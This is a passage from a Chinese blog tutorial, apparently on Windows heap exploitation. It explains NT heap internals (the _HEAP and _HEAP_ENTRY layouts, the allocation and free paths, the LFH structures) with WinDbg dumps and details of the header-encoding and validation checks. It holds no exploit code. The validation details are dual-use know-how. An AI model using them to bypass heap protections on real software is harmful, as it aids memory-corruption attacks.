class="comment">//0xa8</span></span><br><span class="line">    ULONGLONG DeCommitFreeBlockThreshold;                                   <span class="comment">//0xb0</span></span><br><span class="line">    ULONGLONG DeCommitTotalFreeThreshold;                                   <span class="comment">//0xb8</span></span><br><span class="line">    ULONGLONG TotalFreeSize;                                                <span class="comment">//0xc0</span></span><br><span class="line">    ULONGLONG MaximumAllocationSize;                                        <span class="comment">//0xc8</span></span><br><span class="line">    USHORT ProcessHeapsListIndex;                                           <span class="comment">//0xd0</span></span><br><span class="line">    USHORT HeaderValidateLength;                                            <span class="comment">//0xd2</span></span><br><span class="line">    VOID* HeaderValidateCopy;                                               <span class="comment">//0xd8</span></span><br><span class="line">    USHORT NextAvailableTagIndex;                                           <span class="comment">//0xe0</span></span><br><span class="line">    USHORT MaximumTagIndex;                                                 <span class="comment">//0xe2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TAG_ENTRY</span>* <span class="title">TagEntries</span>;</span>                                     <span class="comment">//0xe8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRList</span>;</span>                                             <span class="comment">//0xf0</span></span><br><span class="line">    ULONGLONG AlignRound;                                                   <span class="comment">//0x100</span></span><br><span class="line">    ULONGLONG AlignMask;                                                    <span class="comment">//0x108</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">VirtualAllocdBlocks</span>;</span>                                 <span class="comment">//0x110</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentList</span>;</span>                                         <span class="comment">//0x120</span></span><br><span class="line">    USHORT AllocatorBackTraceIndex;                                         <span class="comment">//0x130</span></span><br><span class="line">    ULONG NonDedicatedListLength;                                           <span class="comment">//0x134</span></span><br><span class="line">    VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line">    VOID* UCRIndex;                                                         <span class="comment">//0x140</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_PSEUDO_TAG_ENTRY</span>* <span class="title">PseudoTagEntries</span>;</span>                        <span class="comment">//0x148</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LOCK</span>* <span class="title">LockVariable</span>;</span>                                        <span class="comment">//0x160</span></span><br><span class="line">    LONG (*CommitRoutine)(VOID* arg1, VOID** arg2, ULONGLONG* arg3);        <span class="comment">//0x168</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">RTL_RUN_ONCE</span> <span class="title">StackTraceInitVar</span>;</span>                                  <span class="comment">//0x170</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_HEAP_MEMORY_LIMIT_DATA</span> <span class="title">CommitLimitData</span>;</span>                     <span class="comment">//0x178</span></span><br><span class="line">    VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">    USHORT FrontHeapLockCount;                                              <span class="comment">//0x1a0</span></span><br><span class="line">    UCHAR FrontEndHeapType;                                                 <span class="comment">//0x1a2</span></span><br><span class="line">    UCHAR RequestedFrontEndHeapType;                                        <span class="comment">//0x1a3</span></span><br><span class="line">    WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br><span class="line">    USHORT FrontEndHeapMaximumIndex;                                        <span class="comment">//0x1b0</span></span><br><span class="line">    <span class="keyword">volatile</span> UCHAR FrontEndHeapStatusBitmap[<span class="number">129</span>];                           <span class="comment">//0x1b2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_COUNTERS</span> <span class="title">Counters</span>;</span>                                         <span class="comment">//0x238</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TUNING_PARAMETERS</span> <span class="title">TuningParameters</span>;</span>                        <span class="comment">//0x2b0</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>_HEAP</code> 是堆管理的最核心结构，和 linux glibc 的 <code>main_arena</code> 作用类似。每一个 HEAP 都有一个 <code>_HEAP</code> 结构，存在于该 HEAP 的开头。</p><p>根据下面的图片理解其中的一部分参数</p><ul><li><code>EncodeFlagMask</code>：Heap 初始化后会设置为 0x100000 ，用于判断是否要加密该 heap 空间中每个堆的 chunk_header 。</li><li><code>Encoding</code>（<code>_Heap_Entry</code>）：用于与 chunk_header 做异或的 cookies；所有分配的 chunk 的 chunk_header 都会与 <code>Encoding</code> 进行异或，然后在存入内存中。</li><li><code>VirtualAllocdBlocks</code>：一个双向链表的 dummy head ，存放着 <code>Flink</code> 和 <code>Blink</code> ，将 <code>VirtualAllocate</code> 出来的 chunk 链接起来。</li><li><code>BlocksIndex</code>（<code>_Heap_LIST_LOOKUP</code>）：Back-End 中用于管理后端管理器中的 chunk 。</li><li><code>FreeList</code>（<code>_Heap_Entry</code>）：连接 Back-End 中的所有 free chunk ，类似 unsorted bin 。</li><li><code>FrontEndHeap</code>：指向管理 FrontEnd 的 heap 结构。</li><li><code>FrontEndHeapUsageData</code>：指向一个对应各大小 chunk 的数组，记录各种大小 chunk 的使用次数，到达某个程度时会开启该对应大小 chunk 的 Front-End 分配器。<strong>如果开启 LFH 后对应的 <code>FrontEndHeapUsageData</code> 是 <code>SegmentInfoArrays</code> 的下标。</strong></li><li><code>FrontEndHeapStatusBitmap</code>：非常重要。是一个 bitmap 数组，每一项长度为 1 字节，用来记录某个 size 是否开启了 LFH 。判断方式是 <code>_HEAP.FrontEndHeapStatusBitmap[(size &gt;&gt; 4) &gt;&gt; 3] &amp; (1 &lt;&lt; ((size &gt;&gt; 4) &amp; 7))</code> 是否为 1 ，如果是 1 则说明对应 size 开启了 LFH 。</li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759827041548.png" alt="1759827041548"></p><h5 id="HEAP-ENTRY"><a href="#HEAP-ENTRY" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h5><p>最普通的_HEAP_ENTRY结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint2B Size;</span><br><span class="line">    Uchar Flags;</span><br><span class="line">    Uchar SmallTagIndex;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与linux类似, 也是头部 + User Data的形式，</p><p>Allocated chunk图解：</p><ul><li><p><code>PreviousBlockPrivateData</code>：8 字节，可为前一块 chunk 的 data ，因为 chunk 必须对齐。</p></li><li><p><code>Size</code>: chunk 的大小，为实际大小右移 4bit 后的值。比如大小为 0x80 的 chunk 的 <code>Size</code> 值为 0x8 。</p></li><li><p><code>Flags</code>: 表示该chunk的状态：</p><ul><li><code>HEAP_ENTRY_BUSY(01)</code> 堆块处于占用状态</li><li><code>HEAP_ENTRY_EXTRA_PRESENT(02)</code> 该块存在额外的描述 <code>_HEAP_ENTRY_EXTRA</code></li><li><code>HEAP_ENTRY_FILE_PATTERN(03)</code> 使用固定模式填充堆块<ul><li><code>HEAP_ENTRY_VIRTUAL_ALLOC(08)</code> 通过 virtual allocation 虚拟分配的堆块</li></ul></li><li><code>HEAP_ENTRY_LAST_ENTRY(10)</code> 表示是该段的最后一个堆块</li></ul></li><li><p><code>SmallTagIndex</code>: 前 3 个字节异或后的值，用于验证。</p></li><li><p><code>PreviousSize</code>: 前⼀个 chunk 的大小，为实际大小右移 4bit 后的值。</p></li><li><p><code>SegmentOffset</code>: 在某种情况下用来寻找 Heap 的。</p></li><li><p><code>Unusedbytes</code>：整个 chunk 的大小减去用户 malloc 的大小，因为如果 chunk 是在使用状态 <code>Unusedbytes</code> 一定不为 0 ，因此可以判断 chunk 是否空闲（&amp;0x3F 是否为 0）。另外这个值还有一个 0x80 的标志位也可以用来判断 chunk 的状态是前端堆还是后端堆。</p><ul><li>在freed的时候, 恒为0</li></ul></li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759827663746.png" alt="1759827663746"></p><p>chunk_header在内存中是加密的，解密需要和 <code>_HEAP-&gt;Encoding</code>进行异或</p><p>Freed chunk图解：</p><p>多了一个 <code>_LIST_ENTRY</code> 结构</p><ul><li><code>Flags</code> 为 0 表示 freed</li><li><code>UnusedBytes</code> （&amp;0x3f）始终为 0</li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759827677806.png" alt="1759827677806"></p><h5 id="HEAP-LIST-LOOKUP"><a href="#HEAP-LIST-LOOKUP" class="headerlink" title="_HEAP_LIST_LOOKUP"></a>_HEAP_LIST_LOOKUP</h5><p>(BlocksIndex)_HEAP_LIST_LOOKUP用来管理各种不同大小的 freed chunk ，能快速的找到合适的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x38 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span>* <span class="title">ExtendedLookup</span>;</span>                               <span class="comment">//0x0</span></span><br><span class="line">    ULONG ArraySize;                                                        <span class="comment">//0x8</span></span><br><span class="line">    ULONG ExtraItem;                                                        <span class="comment">//0xc</span></span><br><span class="line">    ULONG ItemCount;                                                        <span class="comment">//0x10</span></span><br><span class="line">    ULONG OutOfRangeItems;                                                  <span class="comment">//0x14</span></span><br><span class="line">    ULONG BaseIndex;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">ListHead</span>;</span>                                           <span class="comment">//0x20</span></span><br><span class="line">    ULONG* ListsInUseUlong;                                                 <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>** <span class="title">ListHints</span>;</span>                                         <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><ul><li><code>ExtendedLookup (Ptr64 _HEAP_LIST_LOOKUP)</code>：指向下一个 <code>BlocksIndex</code>，通常下一个 <code>BlocksIndex</code>会管理更大的 chunk 。</li><li><code>ArraySize</code>：该结构会管理最大 chunk 的大小 + 0x10 。上面例子中 <code>ArraySize</code> 为 0x80 但由于右移实际是 0x800 。</li><li><code>ItemCount</code>：4 字节，目前该结构所管理的 chunk 数。</li><li><code>OutofRangeItems</code>：超出该结构所管理大小的 chunk 的数量。</li><li><code>BaseIndex</code>：该结构所管理的 chunk 的起始 index ，将 <code>(Aligned(size) &gt;&gt; 4) - BaseIndex</code> 作为 <code>ListHint</code> 中查找的下标。通常下一个 <code>BlocksIndex</code> 将上一个 <code>BlocksIndex</code> 的 <code>ArraySize</code> 作为 <code>BaseIndex</code> 。</li><li><code>ListHead</code>：指向 <code>_HEAP</code> 的 <code>FreeList</code> 。</li><li><code>ListsInUseUlong</code>：用在判断 <code>ListHint</code> 中是否有适合大小的 chunk ，是一个 bitmap 。</li><li><code>ListHint</code>：十分重要，用来指向对应大小的 chunk array ，其目的就在于更快速找到适合大小的 chunk ，0x10 大小为一个间隔。可以类比linux ptmalloc的tcache bin, 只不过chunk的组织仍然通过双向链表维护</li></ul><h4 id="分配机制-RtlAllocateHeap"><a href="#分配机制-RtlAllocateHeap" class="headerlink" title="分配机制(RtlAllocateHeap)"></a>分配机制(RtlAllocateHeap)</h4><p>根据分配大小主要有三种：</p><ul><li><strong>case1</strong> : <code>size &lt;= 0x4000</code></li><li><strong>case2</strong> : <code>0x4000 &lt; size &lt;= 0xff000</code></li><li><strong>case3</strong> : <code>size &gt; 0xff000</code></li></ul><p>case1：</p><p>还是需要这个图进行理解</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759831326041.png" alt="1759831326041"></p><ul><li>检查是否有该 <code>Size</code> 对应的 <code>FrontEndHeapStatusBitmap</code>，判断是否启动了LFH</li><li>遍历 <code>BlocksIndex</code> 链表，找到第一个 <code>ArraySize</code> 大于 <code>Size</code> 的 <code>BlocksIndex</code> ，然后找到对应的 <code>ListHint</code> ，即 <code>BlocksIndex-&gt;ListHints[Size - BlocksIndex-&gt;BaseIndex]</code> 。调用 <code>RtlpAllocateHeap</code> 函数分配内存。</li><li>查看对应的 <code>ListHint</code> 中是否有值（也就是ListHint数组里否有对应 size 的 freed chunk）：<ul><li><p>如果刚好有值，就检查该 chunk 的 <code>Flink</code> （下一个freed chunk）是否是同样 size 的 chunk ：</p><ul><li>若是则将 <code>Flink</code> 写到对应的 <code>ListHint</code> 中。</li><li>若否则清空对应 <code>ListHint</code> 。</li></ul><p>最后将该 chunk 从 <code>Freelist</code> 中 unlink 出来（同时header也会恢复正常）。</p></li><li><p>如果对应的 <code>ListHint</code> 中本身就没有值，就从比较大的 <code>ListHint</code> 中找：</p><ul><li>如果找到了，就以上述同样的方式处理该 <code>ListHint</code> ，并 unlink 该 chunk ，之后对其进行切割，剩下的重新放入 <code>FreeList</code> ，如果可以放进 <code>ListHint</code> 就会放进去，再 encode header 。</li><li>如果没较大的 <code>ListHint</code> 也都是空的，那么尝试 <code>ExtendedHeap</code> 加大堆空间，再从 extend 出来的 chunk 拿，接着一样切割，放回 <code>ListHIint</code> ，encode header 。</li></ul></li></ul></li></ul><p>case2：没有LFH检查，其他和case1一样</p><p>case3：直接调用 <code>ZwAllocateVirtualMemroy</code> 进行分配，类似于 linux 下的 <code>mmap</code> 直接给一大块地址，并且插入 <code>_HEAP-&gt;VirtualAllocdBlocks</code> 中。</p><h4 id="Free-RtlFreeHeap"><a href="#Free-RtlFreeHeap" class="headerlink" title="Free (RtlFreeHeap)"></a>Free (RtlFreeHeap)</h4><ul><li>调用 <code>RtlpValidateHeapEntry</code> 对要释放的 chunk 进行一系列的检查：<ul><li>释放的 <code>_HEAP_ENTRY</code> 是否为 NULL</li><li>释放的 <code>_HEAP_ENTRY</code> 地址是否关于 0x10 对齐</li><li>通过 <code>UnusedBytes &amp; 0x3F</code> 是否为 0 判断 <code>_HEAP_ENTRY</code> 是否已被释放过，相当于判断Double Free</li><li>检查校验位 <code>SmallTagIndex</code> （先当于checksum）</li><li>如果 <code>UnusedBytes</code> 为 4 即通过 <code>ZwAllocateVirtualMemroy</code> 分配的内存，则判断整个 <code>_HEAP_VIRTUAL_ALLOC_ENTRY</code> 是否关于 0x1000 对齐</li><li>如果 <code>UnusedBytes</code> 不为 4 则通过 <code>SegmentOffset</code> 找到 <code>_HEAP</code> 然后判断 <code>_HEAP_ENTRY</code> 是否在 <code>[Heap-&gt;Segment.FirstEntry, Heap-&gt;Segment.LastValidEntry)</code> 范围内</li></ul></li><li>调用 <code>RtlFreeHeap</code> ，进而调用 <code>RtlpFreeHeapInternal</code> ，通过 <code>Heap-&gt;Segment.SegmentSignature</code> 判断是否为 Segment Heap ，如果是则单独处理，否则继续执行。</li><li>判断地址是否关于 0x10 对齐以及通过 <code>UnusedBytes &amp; 0x3F</code> 是否为 0 判断 <code>_HEAP_ENTRY</code> 是否已被释放过。（重复？）</li><li>根据 <code>UnusedBytes</code> 是否小于 0 （0x80 是否置位）判断是否是 LFH 堆，如果不是则调用后端堆释放的核心函数 <code>RtlpFreeHeap</code> 。</li><li>解密 <code>_HEAP_ENTRY</code> 并校验 <code>SmallTagIndex</code> ，根据 chunk 大小找到对应的 <code>BlocksIndex</code> 。</li><li>根据 <code>UnusedBytes</code> 是否为 4 判断是否是通过 <code>ZwAllocateVirtualMemroy</code> 分配的内存。如果是则检查该 chunk 的 <code>_HEAP_ENTRY-&gt;Flink-&gt;Blink == _HEAP_ENTRY-&gt;Blink-&gt;Flink == &amp;_HEAP_ENTRY</code> 并从 <code>_HEAP-&gt;VirtualAllocdBlocks</code> 中移除，接着使用 <code>RtlpSecMemFreeVirtualMemory</code> 将 chunk 整个 munmap 掉。（类似于unlink检查）</li><li>如果 chunk 大小在 LFH 堆的范围内（<code>_HEAP_ENTRY-&gt;Size &lt; _HEAP-&gt;FrontEndHeapMaximumIndex</code>），会将对应的 <code>FrontEndHeapUsageData -= 1</code>（并不是0x21）。</li><li>接着判断前后的 chunk 是否是 freed 的状态（根据 <code>_HEAP_ENTRY.Flags</code> 的 1 是否置位判断），如果是的话就检查前后的 freed chunk （校验 <code>SmallTagIndex</code> 以及 <code>_HEAP_ENTRY-&gt;Flink-&gt;Blink == _HEAP_ENTRY-&gt;Blink-&gt;Flink == &amp;_HEAP_ENTRY</code>）然后将前后的 freed chunk 从 <code>FreeList</code> 中 unlink 下来（与上面的方式一样更新 <code>ListHint</code>），再进行合并。</li><li>合并完之后更新 <code>Size</code> 和 <code>PreviousSize</code> ，判断一下 <code>Size</code> 较大的情况，然后把合并好的 chunk 插入到 <code>ListHint</code> 中；插入时也会对 <code>FreeList</code> 进行检查（但是此检查不会触发 abort ，原因在于没有做 unlink 写入）。</li></ul><h3 id="LFH堆"><a href="#LFH堆" class="headerlink" title="LFH堆"></a>LFH堆</h3><p>当同一个大小的堆块分配次数过多的时候，除了从后端堆分配所需堆块外，还会额外分配一块很大的内存供前端堆使用，之后再次分配该大小的堆块的时候会从前端堆分配。</p><h4 id="相关结构体-1"><a href="#相关结构体-1" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="FrontEndHeap（-LFH-HEAP）"><a href="#FrontEndHeap（-LFH-HEAP）" class="headerlink" title="FrontEndHeap（_LFH_HEAP）"></a>FrontEndHeap（_LFH_HEAP）</h5><p>通过 <code>_HEAP</code> 的 <code>FrontEndHeap</code> 成员指针访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">   +0x000 Lock             : _RTL_SRWLOCK</span><br><span class="line">   +0x008 SubSegmentZones  : _LIST_ENTRY</span><br><span class="line">   +0x018 Heap             : Ptr64 Void</span><br><span class="line">   +0x020 NextSegmentInfoArrayAddress : Ptr64 Void</span><br><span class="line">   +0x028 FirstUncommittedAddress : Ptr64 Void</span><br><span class="line">   +0x030 ReservedAddressLimit : Ptr64 Void</span><br><span class="line">   +0x038 SegmentCreate    : Uint4B</span><br><span class="line">   +0x03c SegmentDelete    : Uint4B</span><br><span class="line">   +0x040 MinimumCacheDepth : Uint4B</span><br><span class="line">   +0x044 CacheShiftThreshold : Uint4B</span><br><span class="line">   +0x048 SizeInCache      : Uint8B</span><br><span class="line">   +0x050 RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">   +0x060 UserBlockCache   : [12] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">   +0x2a0 MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">   +0x2a4 Buckets          : [129] _HEAP_BUCKET</span><br><span class="line">   +0x4a8 SegmentInfoArrays : [129] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +0x8b0 AffinitizedInfoArrays : [129] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +0xcb8 SegmentAllocator : Ptr64 _SEGMENT_HEAP</span><br><span class="line">   +0xcc0 LocalData        : [1] _HEAP_LOCAL_DATA</span><br></pre></td></tr></table></figure><ul><li><code>Heap</code>, 指向其对应的 <code>_HEAP</code>结构体</li><li><code>Buckets</code>, 一个存放129个 <code>_HEAP_BUCKET</code>结构体的数组, 用来寻找配置大小对应到Block大小的阵列结构</li><li><code>SegmentInfoArrays</code>, 一个存放129个 <code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体指针的数组, 不同大小对应到不同的 <code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体, 主要管理对应到的 <code>_HEAP_SUBSEGMENT</code>的信息</li><li><code>LocalData</code>, 一个 <code>_HEAP_LOCAL_DATA</code>结构体</li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759903256842.png" alt="1759903256842"></p><h5 id="Buckets（-HEAP-BUCKET）"><a href="#Buckets（-HEAP-BUCKET）" class="headerlink" title="Buckets（_HEAP_BUCKET）"></a>Buckets（_HEAP_BUCKET）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_BUCKET</span><br><span class="line">   +0x000 BlockUnits       : Uint2B</span><br><span class="line">   +0x002 SizeIndex        : UChar</span><br><span class="line">   +0x003 UseAffinity      : Pos 0, 1 Bit</span><br><span class="line">   +0x003 DebugFlags       : Pos 1, 2 Bits</span><br><span class="line">   +0x003 Flags            : UChar</span><br></pre></td></tr></table></figure><ul><li><code>BlockUnits</code>, 要分配出去的一个block的大小, 存放 <code>size &gt;&gt; 4</code>，对应SegmentInfoArray中_HEAP_SUBSEGMENT结构体中的BlockSize</li><li><code>SizeIndex</code>, bucket下标 ，<code>SegmentInfoArrays</code> 对应位置的 <code>BucketIndex</code></li></ul><h5 id="UserBlocks（-HEAP-USERDATA-HEADER）"><a href="#UserBlocks（-HEAP-USERDATA-HEADER）" class="headerlink" title="UserBlocks（_HEAP_USERDATA_HEADER）"></a>UserBlocks（_HEAP_USERDATA_HEADER）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:017&gt; dx -r1 ((ntdll!_HEAP_USERDATA_HEADER *)0x20793447a10)</span><br><span class="line">((ntdll!_HEAP_USERDATA_HEADER *)0x20793447a10)                 : 0x20793447a10 [Type: _HEAP_USERDATA_HEADER *]</span><br><span class="line">    [+0x000] SFreeListEntry   [Type: _SINGLE_LIST_ENTRY]</span><br><span class="line">    [+0x000] SubSegment       : 0x2079341f200 [Type: _HEAP_SUBSEGMENT *]</span><br><span class="line">    [+0x008] Reserved         : 0x20793406330 [Type: void *]</span><br><span class="line">    [+0x010] SizeIndexAndPadding : 0xc [Type: unsigned long]</span><br><span class="line">    [+0x010] SizeIndex        : 0xc [Type: unsigned char]</span><br><span class="line">    [+0x011] GuardPagePresent : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x012] PaddingBytes     : 0x0 [Type: unsigned short]</span><br><span class="line">    [+0x014] Signature        : 0xf0e0d0c0 [Type: unsigned long]</span><br><span class="line">    [+0x018] EncodedOffsets   [Type: _HEAP_USERDATA_OFFSETS]</span><br><span class="line">    [+0x020] BusyBitmap       [Type: _RTL_BITMAP_EX]</span><br><span class="line">    [+0x030] BitmapData       [Type: unsigned __int64 [1]]</span><br></pre></td></tr></table></figure><ul><li><p><code>SubSegment (_HEAP_SUBSEGMENT)</code>：指回对应的 <code>SubSegment</code></p></li><li><p><code>EncodedOffsets</code>：用来验证 chunk header 是否被修改过，由下面 4 个值异或：</p><ul><li><code>RtlpLFHKey</code>：进程创建时初始化的一个 8 字节随机数</li><li><code>UserBlock</code> 的地址</li><li><code>UserBlock</code> 对应的 <code>LowFragHeap</code> 的地址</li><li><code>sizeof(UserBlocks) | ((0x10 * BlockIndex) &lt;&lt; 16)</code></li></ul><p>在释放一个 LFH chunk 时，NT Heap 会通过 <code>UserBlock ^ RtlpLFHKey ^ _SegmentInfoArray-&gt;EncodedOffsets ^ LowFragHeap</code> 计算出 <code>sizeof(UserBlocks) | ((0x10 * BlockIndex) &lt;&lt; 16)</code> 的值，进而计算出 chunk 的地址与要释放的 chunk 的地址进行比较，从而验证 chunk header 是否被修改过。</p></li><li><p><code>BusyBitmap</code>：记录 <code>UserBlock</code> 中在使用的 chunk 的 bitmap</p></li><li><p><code>Block</code>：LFH 返回给使用者的 chunk</p></li></ul><h5 id="HEAP-ENTRY-1"><a href="#HEAP-ENTRY-1" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint4B SubSegmentCode;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>size</code>, <code>Flags</code>和 <code>SmallTagIndex</code>变成了 <code>SubSegmentCode</code></p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759909553929.png" alt="1759909553929"></p><ul><li><p><code>SubSegmentCode</code>：用来计算 <code>UserBlock</code> 的地址，是下面 4 个值的异或(所有 <code>UserBlocks</code>里的chunk header在初始化的时候都会经过xor)：</p><ul><li>chunk 对应的 <code>_HEAP</code> 地址的低 4 字节</li><li><code>RtlpLFHKey</code> 的低 4 字节</li><li>chunk 地址右移 4 bit</li><li>chunk 与其所在的 <code>UserBlock</code> 的距离左移 12 bit <code>((chunk address) - (UserBLocks address)) &lt;&lt; 12</code></li></ul></li><li><p><code>PreviousSize</code>：该 chunk 在 <code>UserBlock</code> 中的 index 左移 8 bit</p></li><li><p><code>SegmentOffset</code>：通常为 0 ，没有用。</p></li><li><p><code>UnusedBytes</code>：在空闲 chunk 中为 0x80，在使用的chunk 中为 <code>UnusedBytes &gt;= 0x3F ? 0xBF : (UnusedBytes | 0x80)</code></p></li></ul><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在 <code>FrontEndHeapUsageData[x] &amp; 0x1F &gt; 0x10</code>时, 置位 <code>_HEAP-&gt;CompatibilityFlag |= 0x20000000</code>, 下一次allocate(也就是第18次)就会启用LFH并初始化</p><p>分配机制还是有些复杂了，交给AI简化一下</p><p>第 18 次 malloc：</p><ul><li><p><code>_HEAP-&gt;BlocksIndex</code> 是一个管理不同尺寸范围的 <code>_HEAP_LIST_LOOKUP</code> 结构体链表。默认只管理小尺寸 chunk (e.g., <code>&lt; 0x800</code>)。为了支持 LFH，系统会 <strong>扩展此链表</strong> ，追加新的节点以管理更大的尺寸范围（e.g., <code>0x800</code> 到 <code>0x4000</code>）。</p></li><li><p>针对当前被激活的尺寸 <code>x</code>，系统会初始化其对应的 Bucket。具体动作是在 <code>_LFH_HEAP-&gt;SegmentInfoArrays</code> 数组中，填入一个指向 <code>_HEAP_LOCAL_SEGMENT_INFO</code> 结构体的指针。这个结构体是该特定尺寸的“分配管理器”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> 0:000&gt; dt _LFH_HEAP 0x2bacb070000</span><br><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">   +0x000 Lock             : _RTL_SRWLOCK</span><br><span class="line">   +0x008 SubSegmentZones  : _LIST_ENTRY [ 0x000002ba`cb105e30 - 0x000002ba`cb105e30 ]</span><br><span class="line">   +0x018 Heap             : 0x000002ba`cb100000 Void</span><br><span class="line">   +0x020 NextSegmentInfoArrayAddress : 0x000002ba`cb071080 Void</span><br><span class="line">   +0x028 FirstUncommittedAddress : 0x000002ba`cb072000 Void</span><br><span class="line">   +0x030 ReservedAddressLimit : 0x000002ba`cb0d2000 